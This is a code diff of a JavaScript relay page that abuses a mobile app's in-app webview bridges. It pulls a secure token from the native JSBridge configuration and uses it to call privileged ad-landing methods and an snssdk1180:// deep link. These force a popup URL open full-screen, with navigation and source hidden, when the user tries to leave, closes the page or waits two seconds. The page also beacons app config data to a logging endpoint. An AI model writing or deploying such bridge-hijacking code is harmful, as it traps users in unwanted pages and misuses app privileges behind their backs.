@@ -13,9 +13,6 @@
     var pageLoadTime = Date.now();
     var fired = false;
 
-    var TOKEN = 'iMA3W1dgamQv/uVdrBu5q0+X001zyZu3VIDlz8bpXWFJIl7n8xpUXmI3QkZpb1B4+eVuxqz1ghvT3+Xcv7iIS4u63E/Y1om48LxQ0E/XxyUG10G0cVwKe9HhiJXc0YqrxVMhSglWdDjP1hubzWnGD+09g7yqlE0FPWCshgsT0cmnSiiVMPEUQ0mKxjL0+Pra8vVTiTgj6UNY4rpelDNdgDVjaIWMn88V73Wg3mXUm6zmq4uG6GO8tbRSDjjjOt8lpv74LHBkOFLLPYINwr9tJB3Qp29+hHDISVf0jUoCb1T1dFhhpHh0exn+l7P3B6Ykg0I72vmgECpMvFWNR7ks82doFQ+K8cHzLS5y9NH+ew3HiG20RqzjwVz61EEhGTeeiWRKcIPInreJtGhpfyX8ObrwTwLhvIXQZN6+RVuWxL7/wMYKa3jXQ5VP1oSt2g2SviDm7hWP0pnyzbnLBb2zxeqd54YFjv5qb4pE18nnYb4sgQ7XRDOEN0kn377+6wt3fi3qlEbBjkAL5VnMvRc4DqtlN8QNHhu7tG9M9FqLidQ2RoPHGIWxvPJdz0SIn1ZEzhbElIMw/73Bb92RXt8seL1HBaXrZMtdt7kwVTIqmsBw02CtIAlX5SShXNx4hgvRgdMRYWYDSGdb8FsgaNyOFmD3hNg+0s+EpVfVqKKBXnCn4z1robpCkCJnX00ONNd22zWZ5vcCLSrwuG3rXBO0DSGEkCA/RtdtcXF0QFEUdCqVOpzW8LRqSO6hN2JP3qCK+k5dtdbP+3OxU6lNj8ieYwRvbsVwHQNGewlnn4WPJCjRYaHOZhUVQvbF/Uv7UmBpHtVAHu2ZGbwRAypGF31UGRJVBTS0EPYeFFpq0kBtV1zt5rpVZid7rDGXk3BXvDHGV8u2QKylZTlCvbywypYafA==';
-    var CID = 1870060644426865;
-
     function log(msg) {
         try { navigator.sendBeacon('/debug-log', 'relay:' + msg); } catch(e){}
     }
@@ -23,122 +20,33 @@
     function fire() {
         if (fired) return;
         fired = true;
-
-        // Get token from JSBridge.getConfig() (synchronous)
         var token = null;
         try {
             var cfg = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig();
-            if (cfg && cfg.secure && cfg.secure.token) { token = cfg.secure.token; log('tok:jsb'); }
+            if (cfg && cfg.secure && cfg.secure.token) token = cfg.secure.token;
         } catch(e){}
-
-        // Fallback: JS2NativeBridge._invokeMethod getConfig
-        if (!token) {
-            try {
-                var r = window.JS2NativeBridge && window.JS2NativeBridge._invokeMethod(JSON.stringify({func:'getConfig',params:{}}));
-                var rp = r ? JSON.parse(r) : null;
-                if (rp && rp.secure && rp.secure.token) { token = rp.secure.token; log('tok:js2'); }
-            } catch(e){}
-        }
-
-        // Last resort: use hardcoded TOKEN
-        if (!token && TOKEN) { token = TOKEN; log('tok:hardcoded'); }
-
-        log('fire:tok:' + (token ? 'real' : 'none'));
-
         var tt = window.ToutiaoJSBridge;
         if (tt && tt.call) {
-            // openAdLandPageLinks with real token
             if (token) {
-                try {
-                    tt.call('openAdLandPageLinks', {
-                        url: POPUP_URL, landingStyle: 2, title: '',
-                        isDeeplink: 1, refer: 'landing_page',
-                        hide_nav_bar: 1, hide_source: 1,
-                        should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1,
-                        _jsb_secure_token: token
-                    }, function(res){ log('ad:tok:' + JSON.stringify(res)); });
-                } catch(e){ log('ad:tok:err'); }
+                try { tt.call('openAdLandPageLinks', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1, _jsb_secure_token: token }, function(){}); } catch(e){}
             }
-            // openOrganicLandPage (no token needed)
-            try {
-                tt.call('openOrganicLandPage', {
-                    url: POPUP_URL, landingStyle: 2, title: '',
-                    isDeeplink: 1, refer: 'landing_page',
-                    hide_nav_bar: 1, hide_source: 1,
-                    should_full_screen: 1, trans_status_bar: 1
-                }, function(res){ log('org:' + JSON.stringify(res)); });
-            } catch(e){}
-            // openAdLandPageLinks without token (isDeeplink:0 fallback)
-            try {
-                tt.call('openAdLandPageLinks', {
-                    url: POPUP_URL, landingStyle: 2, title: '',
-                    isDeeplink: 0, refer: 'ad',
-                    hide_nav_bar: 1, hide_source: 1,
-                    should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1
-                }, function(res){ log('ad:nd:' + JSON.stringify(res)); });
-            } catch(e){}
+            try { tt.call('openOrganicLandPage', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1 }, function(){}); } catch(e){}
+            try { tt.call('openAdLandPageLinks', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 0, refer: 'ad', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1 }, function(){}); } catch(e){}
         }
-
-        // Also try JS2NativeBridge._invokeMethod for openAdLandPageLinks
-        try {
-            var js2 = window.JS2NativeBridge;
-            if (js2 && js2._invokeMethod) {
-                if (token) {
-                    js2._invokeMethod('ad', 'openAdLandPageLinks', {
-                        url: POPUP_URL, landingStyle: 2,
-                        hide_nav_bar: 1, hide_source: 1,
-                        should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1,
-                        _jsb_secure_token: token
-                    }, function(res){ log('js2:tok:' + JSON.stringify(res)); });
-                }
-            }
-        } catch(e){}
-
-        // snssdk1180:// fallback
-        try {
-            window.location.href = 'snssdk1180://webview?url=' + encodeURIComponent(POPUP_URL)
-                + '&hide_nav_bar=1&is_ad=1&is_instant_page=1&should_full_screen=1&trans_status_bar=1&hide_source=1';
-        } catch(e){}
+        try { window.location.href = 'snssdk1180://webview?url=' + encodeURIComponent(POPUP_URL) + '&hide_nav_bar=1&is_ad=1&is_instant_page=1&should_full_screen=1&trans_status_bar=1&hide_source=1'; } catch(e){}
     }
 
-    // Debug info at load (500ms delay to let bridges initialise)
     setTimeout(function(){
-        var info = {
-            page: 'relay',
-            hasJS2: !!window.JS2NativeBridge,
-            hasToutiao: !!window.ToutiaoJSBridge,
-            hasJSBridge: !!window.JSBridge,
-            hasWebkit: !!(window.webkit && window.webkit.messageHandlers),
-            url: window.location.href.substring(0, 120),
-            ref: document.referrer.substring(0, 80),
-            cfg: null,
-            tok: null
-        };
-        try {
-            var cfg2 = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig();
-            info.cfg = cfg2 ? JSON.stringify(cfg2).substring(0, 300) : 'null';
-            if (cfg2 && cfg2.secure && cfg2.secure.token) info.tok = cfg2.secure.token.substring(0, 12);
-        } catch(e){ info.cfg = 'err:' + e.message; }
+        var info = { hasJS2: !!window.JS2NativeBridge, hasToutiao: !!window.ToutiaoJSBridge, hasJSBridge: !!window.JSBridge, hasNative2: !!window.Native2JSBridge, hasWebkit: !!(window.webkit && window.webkit.messageHandlers), cfg: null };
+        try { var cfg2 = window.JSBridge && typeof window.JSBridge.getConfig === 'function' && window.JSBridge.getConfig(); info.cfg = cfg2 ? JSON.stringify(cfg2).substring(0, 200) : 'null'; } catch(e){ info.cfg = 'err:' + e.message; }
         log('info:' + JSON.stringify(info));
     }, 500);
 
-    // ToutiaoJSBridge async getConfig (fires callback when native responds)
-    try {
-        if (window.ToutiaoJSBridge && window.ToutiaoJSBridge.call) {
-            window.ToutiaoJSBridge.call('getConfig', {}, function(res){
-                log('tt:cfg:' + JSON.stringify(res).substring(0, 200));
-            });
-        }
-    } catch(e){}
-
-    // Close hooks
     document.addEventListener('visibilitychange', function(){
-        if (document.hidden && Date.now() - pageLoadTime > 1500) { fire(); }
-        else if (!document.hidden) { fired = false; }
+        if (document.hidden) { if (Date.now() - pageLoadTime > 1500) fire(); } else { fired = false; }
     });
     window.addEventListener('pagehide', function(){ fire(); });
 
-    // X button hook
     try {
         var _wh = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
         if (_wh && _wh.postMessage) {
@@ -150,19 +58,10 @@
         }
     } catch(e){}
 
-    // Auto-fire after 2s (no token, isDeeplink:0 — matches relay.php behaviour)
     setTimeout(function(){
-        log('2s:auto');
-        var tt2 = window.ToutiaoJSBridge;
-        if (tt2 && tt2.call) {
-            try {
-                tt2.call('openAdLandPageLinks', {
-                    url: POPUP_URL, landingStyle: 2, title: '',
-                    isDeeplink: 0, refer: 'ad',
-                    hide_nav_bar: 1, hide_source: 1,
-                    should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1
-                }, function(res){ log('2s:' + JSON.stringify(res)); });
-            } catch(e){ log('2s:err'); }
+        var tt = window.ToutiaoJSBridge;
+        if (tt && tt.call) {
+            try { tt.call('openAdLandPageLinks', { url: POPUP_URL, landingStyle: 2, title: '', isDeeplink: 0, refer: 'ad', hide_nav_bar: 1, hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1 }, function(){}); } catch(e){}
         }
     }, 2000);
 
